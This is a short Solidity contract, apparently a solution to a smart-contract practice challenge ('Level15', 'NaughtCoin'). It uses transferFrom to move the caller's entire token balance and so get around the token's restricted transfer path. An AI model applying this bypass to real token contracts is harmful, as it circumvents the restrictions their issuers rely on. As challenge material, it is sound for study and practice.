// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Level15.sol";

contract Attack {
    function atatatak(NaughtCoin _token) public {
        _token.transferFrom(
            msg.sender,
            address(1),
            _token.balanceOf(msg.sender)
        );
    }
}
